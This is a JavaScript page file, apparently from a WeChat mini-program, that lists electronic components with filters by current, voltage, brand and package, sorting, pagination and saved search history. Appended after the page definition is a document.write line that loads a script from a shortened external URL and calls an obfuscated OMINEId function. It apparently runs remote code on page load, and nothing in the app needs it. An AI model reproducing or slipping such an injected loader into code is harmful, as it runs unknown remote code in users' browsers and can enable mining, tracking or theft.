var t = getApp(),
  a = t.requirejs("core"),
  jq = t.requirejs("jquery"),
  e=jq,
  icons= t.requirejs("icons"),
  timer;
Page({
  data: {
    icons: t.requirejs("icons"),
    isFilterShow: false,
    listmode: "block",
    listsort: "",
    page: 1,
    loaded: false,
    loading: true,
    empty:false,
    allcategory: [],
    catlevel: -1,
    opencategory: false,
    category: {},
    category_child: [],
    category_third: [],
    filterBtns: {},
    isfilter: 0,
    list: [{ id: "55", type: "test", salenum: "455", rangeprice: "0.1 - 0.5", thumb: "/static/images/recommend_left.jpg", total: 1, ispresell: 1, title: "ME6211C33M5G 盘装", detail: "单路LDO,输入电压2-6v,输出电压3.3v,输出电流，输出精度高:±2%,封装:SOT23-5,", minprice: "54.12" }],
    params: {},
    total: 0,
    defaults: {
      keywords: " ",
      isrecommand: "",
      ishot: "",
      isnew: "",
      isdiscount: "",
      issendfree: "",
      istime: "",
      p_sign:"",
      page:1,
      pageSize:10,
      cate: "",
      order: "default",
      by: "desc",
      merchid: 0
    },
    listorder: { store: "/static/images/icon/listsort.png",sales: "/static/images/icon/listsort.png", minprice: "/static/images/icon/listsort.png" },
    lastcat: "",
    fromsearch: false,
    searchRecords: [],
    searchitem: {
      twoInput: [{ name: "电流(A)", keyword_start: "current_start", keyword_end: "current_end", keyword: "current" }, { name: "输入电压(V)", keyword_start: "input_start", keyword_end: "input_end", keyword: "input" }, { name: "输出电压(V)", keyword_start: "output_start", keyword_end: "output_end", keyword: "output"}],
      oneInput: [{ name: "品牌", keyword: "brand_id", choose: "全部" }, { name: "分类", keyword: "cate_id", choose: "全部" }, { name: "封装", keyword: "package", choose: "全部" }/*, { name: "体积", keyword: "volume_length", choose: "全部" }*/],
      hasContentJoin: { "brand_id": "" },
      hasContent: { /*"brand_id": [{ id: "", name: "" }]*/ },
      hasContent_station:{},
      recommend:{input:[1,50],output:[],current:[]},
      getContent: []
      },
    defaultContent: [],
    moreShow: false,
    searchData: {
      "brand_id": [],
        "cate_id": [],
        "package": []
        }
  },
  onLoad: function (t) {
    if (!jq.isEmptyObject(t)) {
      var a = t.isrecommand || t.isnew || t.ishot || t.isdiscount || t.issendfree || t.istime ? 1 : 0;
      this.setData({
        params: t,
        isfilter: a,
        filterBtns: t,
        fromsearch: t.fromsearch || false
      })
    }
    //this.initCategory(),
      !t.fromsearch && this.getList(t);
      this.getRecord();
  },
  onShow: function () {
    this.data.fromsearch && this.setFocus()
  },
  onPullDownRefresh: function () {
    this.setData({
      page: 1,
      empty: true,
      loading: false });
    var params = this.data.params;
    params.page= 1;
    this.getList(params);
    wx.stopPullDownRefresh();
  },
  onReachBottom: function () {
    var obj = this.data.params;
    var pge = this.data.page;
    pge++;
    obj.page = pge;
    if (pge>=100){return;};
    if (!this.data.empty) {
      this.getList(obj);
      this.setData({
        page: pge
      });
    }
  },
  searchKey:function(){
    var _this = this; 
    var param = this.data.params;
    var listorder = this.data.listorder;
      this.setData({
        page: 1,
        list: [],
        loading: true,
        loaded: false,
        //params: defaults,
        listorder: listorder,//{ sales: "/static/images/icon/listsort.png", minprice: "/static/images/icon/listsort.png" },
        fromsearch: false
      });
      this.setRecord(_this.data.params.keywords);
      this.getList(jq.extend(param,{ p_sign: _this.data.params.keywords}));
  },
  moreChoose:function(t){
    //搜索更多选择
   // console.log(this.data.searchitem);
    var types = t.currentTarget.dataset.type;
    var hasContent = this.data.searchitem.hasContent;
    var chooseSearch = [].concat.apply([],this.data.searchData[types]);
    jq.each(chooseSearch,function(ind,val){
      val.checked=false;
    });
    var getContent = this.getMerge("id", chooseSearch,hasContent[types]);//jq.extend(false,[],chooseSearch, hasContent[types]);
    //console.log(this.data.searchData,types);
    this.setData({
      "searchitem.getContent": getContent,
      defaultContent:jq.extend(false,[],this.data.searchData[types]),
      moreShow:true,
      "searchitem.chooseOneid": types
    });
  },
  getMerge:function(key,data1,data2){
    var isArray = jq.isArray(data1);
    if (!data2) { return data1 };
    var newData = jq.extend(isArray?[]:{}, data1);
      jq.each(data2,function(ind,value){
        var total=0;
        jq.each(data1,function(idx,val){
            if(value.id==val.id){
              val.checked=value.checked;
            }else{
              total++;
            }
        });
        if(total == data2.length){
          newData = isArray ? [...newData, ...value] : {...newData, ...value};
        };
      });
    return newData;
  },
  chooseResult:function(t){
    //选择结果
    var types = t.currentTarget.dataset.type;
    var chooseId = this.data.searchitem.chooseOneid;
    //var oneInput = this.data.searchitem.oneInput;
    var updata = { moreShow: false, chooseOneid:""};
    var searchitem = this.data.searchitem;
    if(types != "sure"){
      jq.each(searchitem.getContent,function(ind,val){
        val.checked=false;
      });
      searchitem.hasContent_station[chooseId]=[];
      searchitem.hasContentJoin[chooseId]="";
    }else{
      searchitem.hasContent = jq.extend({},searchitem.hasContent_station,true);
      jq.each(searchitem.oneInput,function(ind,val){
        if (chooseId == val.keyword){
          val.choose = searchitem.hasContentJoin[chooseId] ? searchitem.hasContentJoin[chooseId]:"全部";
        };
      });
    }
    updata.searchitem = searchitem;
    this.setData(updata);
  },
  checkboxChange:function(t){
    //获取复选框结果
    //console.log(t);return;
    var value =t.detail.value||[];
    var chooseId = this.data.searchitem.chooseOneid;
    var searchitem = this.data.searchitem;
    var defalutContent = jq.extend({},this.data.defaultContent);
    var hasContentJoin={};
    if (value.length>0){
      searchitem.hasContent_station[chooseId] =[];
      jq.each(defalutContent,function(ind,val){
        val.checked=false;
      })
      jq.each(value,function(ind,val){
        defalutContent[val].checked = true;
        searchitem.hasContent_station[chooseId].push(defalutContent[val]);
        if (ind > 0) { searchitem.hasContentJoin[chooseId] += "," + defalutContent[val].name; } else { searchitem.hasContentJoin[chooseId] = defalutContent[val].name };
      });
      var datas = searchitem.hasContent_station[chooseId];
      jq.each(datas,function(ind,val){
        if (ind > 0) { searchitem.hasContentJoin[chooseId] += "," + val.name; } else { searchitem.hasContentJoin[chooseId] =val.name};
      });
    }else{
      jq.each(defalutContent, function (ind, val) {
        val.checked = false;
      });
      searchitem.hasContentJoin[chooseId]="";
      searchitem.hasContent_station[chooseId] = [];
    }
    searchitem.getContent = defalutContent;
    //console.log(searchitem);
    this.setData({
      "searchitem": searchitem
    });

  },
  getList: function (addObj,isSearch) {
    wx.showLoading({
      icon: 'loading',
    })
    var _this = this;
    _this.setData({
      loading: true
    });
    var datas = {
      session_token: t.globalData.session_token,
      page:1,
      pageSize:10
    }
    if(addObj){
      datas = jq.extend(datas,addObj);
    };
    //商品列表
    wx.request({
      url: t.globalData.daxin + "/product/productList",
      data: datas,
      method: "POST",
      header: {
        'content-type': 'application/json' 
      },
      success: function (res) {
        wx.hideLoading();
        var oneInput=_this.data.searchitem.oneInput;
        jq.each(oneInput,function(ind,val){
          val.choose="全部";
        });
        var empty = {
          // "searchitem.hasContent": { brand_id: [] },
          // "searchitem.hasContentJoin": {},
          // "searchitem.oneInput": oneInput
          };
        let searchData = jq.extend({}, _this.data.searchData);
        var rsearch = res.data.data.rsearch;
        var searchitem = _this.data.searchitem;
        var request = res.data.request;
        var recommends = _this.data.searchitem.recommend;
        jq.each(rsearch, function (key, val) {
          if (typeof val =="object" && !(val instanceof Array)) {
            var arr = [];
            jq.each(val, function (ind, values) {
              arr.push({
                id: ind,
                name: values,
                checked: false
              });
            });
            if (key == "brand" || key == "cate") {
              searchData[key + "_id"] = arr;
            } else {
              searchData[key] = arr;
            }
          } else {
            searchData[key] = val;
            if (key == "current" || key == "input" || key == "output") {
              recommends[key] = val.split(",");
            }
          }
        });
        var hasContent = {};
        jq.each(searchData, function (ind, val) {
          if (val.length<1) { hasContent[ind] = [];return false;}
          if (request[ind] && (ind == "brand_id" || ind == "cate_id" || ind == "package")) {
            var arrays = request[ind].split(",");
            var temporary = [];
            jq.each(val, function (idx, value) {
              jq.each(arrays, function (key, v) {
                if (v == value.id) {
                  value.checked = true;
                  temporary.push(value);
                }
              });
            });
            hasContent[ind] = temporary;
          }
        });
        jq.each(hasContent, function (ind, val) {
          if (val.length < 1) {
             searchitem.hasContentJoin[ind] ="";
          }else{
            jq.each(val, function (idx, value) {
              if (idx > 0) { searchitem.hasContentJoin[ind] += "," + value.name; } else { searchitem.hasContentJoin[ind] = value.name };
            });
          };
        });
        jq.each(searchitem.oneInput, function (ind, val) {
          val.choose = searchitem.hasContentJoin[val["keyword"]] || "全部";
        });
        searchitem.hasContent = jq.extend({}, hasContent);
        searchitem.hasContent_station = jq.extend({}, hasContent);

        if (res.data.statusCode >= 0 && res.data.data.list.length > 0) {
          var list = [];
          if(datas.page>1)list=_this.data.list;
          var array = res.data.data.list;
          // var rsearch=res.data.data.rsearch;
          // var searchitem =_this.data.searchitem;
          // var request = res.data.request;
          // var recommends=_this.data.searchitem.recommend;
          jq.each(array, function (index, value) {
            var obj = {};
            obj.id = value.id;
            obj.title = value.p_sign;
            obj.detail = value.parameter;
            obj.salenum = value.sell_num > 0 ? value.sell_num : 0;
            obj.store = value.store > 0 ? value.store : 0;
            obj.img = value.img ? value.img.indexOf("http") > 0 ? value.img : (t.globalData.daxinImg + value.img):"";
            obj.rangeprice = parseFloat(value.product_price[value.product_price.length - 1].unit_price).toFixed(2) + "~" + parseFloat(value.product_price[0].unit_price).toFixed(2);
            list.push(obj);
          });
          // jq.each(rsearch,function(key,val){
          //   if(typeof val =="object"){
          //     var arr=[];
          //     jq.each(val,function(ind,values){
          //       arr.push({
          //         id:ind,
          //         name:values,
          //         checked: false
          //       });
          //     });
          //     if (key == "brand" || key == "cate") {
          //       searchData[key + "_id"] = arr;
          //     }else{
          //       searchData[key] = arr;
          //     }
          //   }else{
          //     searchData[key] = val;
          //     if (key == "current" || key == "input" || key == "output") {
          //       recommends[key] = val.split(",");
          //     }
          //   }   
          // });
          // var hasContent={};
          // jq.each(searchData,function(ind,val){
          //   if (request[ind] && (ind == "brand_id" || ind == "cate_id"||ind == "package")){
          //     var array = request[ind].split(",");
          //     var temporary=[];
          //     jq.each(val,function(idx,value){
          //         jq.each(array,function(key,v){
          //           if (v == value.id){
          //             value.checked=true;
          //             temporary.push(value);
          //           }
          //         });
          //     });
          //     hasContent[ind] = temporary;
          //   }
          // }); 
          // jq.each(hasContent, function (ind, val) {
          //   jq.each(val,function(idx,value){
          //     if (idx > 0) { searchitem.hasContentJoin[ind] += "," + value.name; } else { searchitem.hasContentJoin[ind] = value.name };
          //   });
          // });
          // jq.each(searchitem.oneInput,function(ind,val){
          //   val.choose = searchitem.hasContentJoin[val["keyword"]]||"全部";
          // });
          // searchitem.hasContent = jq.extend({}, hasContent,true);
          // searchitem.hasContent_station = jq.extend({}, hasContent, true);
          console.log(searchitem, searchData);
          if (datas.page==1&&list.length <10){
            _this.setData(jq.extend({
              list: list,
              "searchitem": searchitem,
              // "searchitem.hasContentJoin": {},
              "searchitem.recommend": recommends,
              "searchData": searchData,
              params: res.data.request,
              loading: false,
              empty: true
            },isSearch?empty:{}));
          }else{
            _this.setData(jq.extend({
              list: list,
              "searchitem": searchitem,
              "searchData": searchData,
              "searchitem.recommend": recommends,
              params: res.data.request,
              loading: true,
              empty: false
            }, isSearch ? empty : {}));
          };
        } else {
          if (res.data.msg == "没有数据"){
            if (datas.page <=1){
              _this.setData({
                list: [],
                "searchitem": searchitem,
                "searchitem.recommend": recommends,
                "searchData": searchData,
                params: res.data.request,
                // "searchitem": searchitem,
                // "searchData": _this.data.searchitem.searchData,
                loading: false,
                empty:false
              });
            }else{
              _this.setData({              
                empty: true,
                loading:false,
                page:100            
              });
            }
          }else{
            a.alert(res.errMsg);
          }
          
        }
      }
    })

  },
  changeMode: function () {
    "block" == this.data.listmode ? this.setData({
      listmode: ""
    }) : this.setData({
      listmode: "block"
    })
  },
  bindSort: function (t) {
    var a = t.currentTarget.dataset.order,
      e = this.data.params,
      listorder = this.data.listorder;
      // icons = this.data.icons;
      var obj={};
    if ("default" == a) {
         e.order = "",
         e.sort = "",
        // e.show_site = "",
        // obj = e,
           listorder = { sales: icons.listorder, minprice: icons.listorder, store: icons.listorder };
    } else if ("minprice" == a)
      e.order == a ? "desc" == e.by ? (e.by = "asc", obj = { sort: "price 21" }, listorder = { sales: icons.listorder, minprice: icons.listorderdesc, store: icons.listorder }) : (e.by = "desc", obj = { sort: "price 12" }, listorder = { sales: icons.listorder, minprice: icons.listorderasc, store: icons.listorder }) : (e.by = "asc", obj = { sort: "price 21" }, listorder = { sales: icons.listorder, minprice: icons.listorderdesc, store: icons.listorder }), e.order = a
    else if ("sales" == a) {
      if (e.order == a){
        if (e.by == "asc"){
          e.by = "desc";
          obj = { sort: "sell_num 12" };
          listorder = { sales: icons.listorderasc, store: icons.listorder, minprice: icons.listorder };
        }else{
          e.by = "asc";
          obj = { sort: "sell_num 21" };
          listorder = { sales: icons.listorderdesc, store: icons.listorder, minprice: icons.listorder };
          }
      }else{
        e.order = "sales";
        e.by = "asc";
        obj = { sort: "sell_num 21" };
        listorder = { sales: icons.listorderdesc, store: icons.listorder, minprice: icons.listorder };
      };
    } else if ("store" == a){
      if (e.order == a) {
        if (e.by == "asc") {
          e.by = "desc";
          obj = { sort: "store 12" };
          listorder = { store: icons.listorderasc, sales: icons.listorder, minprice: icons.listorder };
        } else {
          e.by = "asc";
          obj = { sort: "store 21" };
          listorder = { store: icons.listorderdesc, sales: icons.listorder, minprice: icons.listorder };
        }
      } else {
        e.order = "store";
        e.by = "asc";
        obj = { sort: "store 21" };
        listorder = { store: icons.listorderdesc, sales: icons.listorder, minprice: icons.listorder };
      };
    }
    this.setData({
      params: jq.extend(e,obj),
      page: 1,
      listorder: listorder,
      list: [],
      loading:true,
      loaded: false,
      sort_selected: a
    });
    obj = jq.extend(obj, e);
    var sends = this.data.filterBtns;
    if(sends.senddata){
      obj = jq.extend(obj, sends.senddata);
    };
    obj.page = 1;
      this.getList(obj)
  },
  showFilter: function () {
    this.setData({
      isFilterShow: !this.data.isFilterShow
    })
  },
  btnFilterBtns: function (t) {
    var a = t.target.dataset.type;
    if (a) {
      var s = { senddata:{}};//this.data.filterBtns;
      s.hasOwnProperty(a) || (s[a] = ""),
        s[a] ? delete s[a] : s[a] = 1;
      var i = jq.isEmptyObject(s) ? 0 : 1;
      switch(a){
        case "isrecommand": s.senddata.show_site=2;break;
        case "isnew": s.senddata.show_site =1;break;
        case "ishot": s.senddata.sell_num ="sell_num";break;
        case "isspecialoffer": s.senddata.show_site =3; break;
      };
      this.setData({
        filterBtns: s,
        isfilter: i
      })
    }
  },
  bindFilterCancel: function () {
    this.data.defaults.cate = "";
    var searchitem=this.data.searchitem;
    searchitem.hasContent={};
    searchitem.hasContentJoin = {};
    searchitem.getContent = {};
    searchitem.chooseOneid = "";
    jq.each(searchitem.oneInput,function(ind,val){
      val.choose="全部";
    });
    var t = this.data.params;
    jq.each(t,function(ind,val){
      if (ind.indexOf("input") > -1 || ind.indexOf("output") > -1 || ind.indexOf("current") > -1 || ind.indexOf("brand") > -1 || ind.indexOf("cate") > -1 || ind.indexOf("package") > -1 || ind.indexOf("volume_length") > -1){
        t[ind] = "";
      }
    });
    searchitem.params=t;
    t.show_site="";
    //console.log(t);
    this.setData({
      page: 1,
      params: t,
      searchitem: searchitem,
      defaultContent:{},
      isFilterShow: false,
      isfilter:false,
      lastcat: "",
      cateogry_parent_selected: "",
      category_child_selected: "",
      category_third_selected: "",
      category_child: [],
      category_third: [],
      filterBtns: {},
      loading: true,
      loaded: false
      //listorder: { sales: "/static/images/icon/listsort.png", minprice:"/static/images/icon/listsort.png"}
      //list: []
    });
      this.getList(t)
  },
  getId:function(arr){
    var returnData="";
    if (!jq.isArray(arr)) return returnData;
      jq.each(arr,function(ind,val){
        if(ind>0){
          returnData+=","+val.id;
        }else{
          returnData =  val.id;
        }
      });
     return returnData;
  },
  bindFilterSubmit: function () {
    //确认筛选
    var t = this.data.params,
      a = this.data.filterBtns;
      a.senddata ? a.senddata : a.senddata={};
      a.senddata.page=1;
    var hascontent= this.data.searchitem.hasContent,
        hascontent_parameter={};
    if (!jq.isEmptyObject(hascontent)){
      for (var key in hascontent) { 
        hascontent_parameter[key] = this.getId(hascontent[key]);
      }
    }
    t = jq.extend(t, hascontent_parameter);
    for (var s in a)
      t[s] = a[s];
    jq.isEmptyObject(a) && (t = this.data.defaults),
      t.cate = this.data.lastcat;
   // if (hascontent_parameter.cate_id) {
      a.senddata.cate_id = hascontent_parameter.cate_id;
    //};
      this.setData({
        page: 1,
        params: jq.extend(t,a.senddata),
        isFilterShow: false,
        filterBtns: a,
        list: [],
        loading: true,
        loaded: false
      }),
      this.getList(jq.extend(t, a.senddata))
  },
  bindCategoryEvents: function (t) {
    var a = t.target.dataset.id;
    this.setData({
      lastcat: a
    });
    var e = t.target.dataset.level;
    1 == e ? (this.setData({
      category_child: [],
      category_third: []
    }), this.setData({
      category_parent_selected: a,
      category_child: this.data.allcategory.children[a]
    })) : 2 == e ? (this.setData({
      category_third: []
    }), this.setData({
      category_child_selected: a,
      category_third: this.data.allcategory.children[a]
    })) : this.setData({
      category_third_selected: a
    })
  },
  bindSearch: function (t) {
    t.target;
    this.setData({
      list: [],
      loading: true,
      loaded: false
    });
    var a = e.trim(t.detail.value),
      s = this.data.defaults;
    "" != a ? (s.keywords = a, this.setData({
      page: 1,
      params: s,
      fromsearch: false
    }), this.getList({ p_sign: a }), this.setRecord(a)) : (s.keywords = "", this.setData({
      page: 1,
      params: s,
      listorder: { sales: "/static/images/icon/listsort.png", minprice: "/static/images/icon/listsort.png" },
      fromsearch: false
    }), this.getList())
  },
  bindInput: function (t) {
    //console.log(t);
    var a = jq.trim(t.detail.value),
      s = this.data.defaults,
      types = t.currentTarget.dataset.type;
    var params = this.data.params;
    var _this=this;
    s = jq.extend(s, params);
      //console.log(a);
    if (types !="search"){
      s[types]=a;
      if (types.indexOf("current") || types.indexOf("input") || types.indexOf("output")){
        var array =types.split("_");
        var sendV="";
        if(array[1]=="start"){
          sendV = a + "," + (params[array[0]+"_end"]||"");
        }else{
          sendV = (params[array[0] + "_start"] || "") + ","+a  ;
        }
        s[array[0]] = sendV;
      };
      //console.log(s);
      this.setData({
        params:s
      });
    }else{
        s.keywords = "";
        s.page = 1;
      this.setData({ page: 1, list: [], "params.page": 1, empty:false});
      if (a == "") {
        this.setData({
          page: 1,
          list: [],
          loading: true,
          loaded: false,
          "searchitem.params":s,
          params: s,
          // listorder: s.by,
          fromsearch: true
        }), this.getRecord();
      } else {
        s.keywords = a;
        s.p_sign = a;
        clearTimeout(timer);
        timer = setTimeout(function () {
          _this.setData({
            params: s,
            fromsearch: false
          }, function () {
            _this.setRecord(a);
            _this.getList(s);
          });

        }, 800);
      }
    }    
  },
  bindFocus: function (t) {
    "" == jq.trim(t.detail.value) && this.setData({
      fromsearch: true
    })
  },
  bindclear: function() {
    var _this =this;
    var defaults =this.data.defaults;
    defaults.keywords="";
    defaults.p_sign="";
    jq.each(defaults, function (ind, val) {
      if (ind.indexOf("input") > -1 || ind.indexOf("output") > -1 || ind.indexOf("current") > -1 || ind.indexOf("brand") > -1 || ind.indexOf("cate") > -1 || ind.indexOf("package") > -1 || ind.indexOf("volume_length") > -1) {
        t[ind] = "";
      }
    });
    var searchitem = this.data.searchitem;
    searchitem.hasContent = {};
    searchitem.hasContentJoin = {};
    searchitem.getContent = {};
    searchitem.chooseOneid = "";
    jq.each(searchitem.oneInput, function (ind, val) {
      val.choose = "全部";
    });
    this.setData({
      "params": defaults,
      isFilterShow: false,
      isfilter: false,
      searchitem: searchitem,
      filterBtns: {},
      listorder: { sales: icons.listsort, minprice: icons.listsort }
    },function(){
      _this.getList(defaults);
    });
    
  },
  bindnav: function (t) {
    var a = jq.trim(t.currentTarget.dataset.text),
      s = this.data.defaults;
      s.keywords = a,
      s.p_sign = a,
      this.setData({
        params: s,
        page: 1,
        fromsearch: false
      }),
        this.getList({ p_sign: a, keywords: a}),
      this.setRecord(a)
  },
  getRecord: function () {
    var a = t.getCache("searchRecords");
    this.setData({
      searchRecords: a
    })
  },
  setRecord: function (a) {
    if ("" != a) {
      var s = t.getCache("searchRecords");
      if (jq.isArray(s)) {
        var i = [];
        i.push(a);
        for (var r in s) {
          if (i.length > 20)
            break;
          s[r] != a && null != s && "null" != s && i.push(s[r])
        }
        s = i
      } else
        s = [], s.push(a);
      t.setCache("searchRecords", s)
    } else
      t.setCache("searchRecords", []);
    this.getRecord()
  },
  delRecord: function () {
    this.setRecord(""),
      this.setData({
        fromsearch: true
      })
  },
  setFocus: function () {
    var t = this;
    setTimeout(function () {
      t.setData({
        focusin: true
      })
    }, 1000)
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
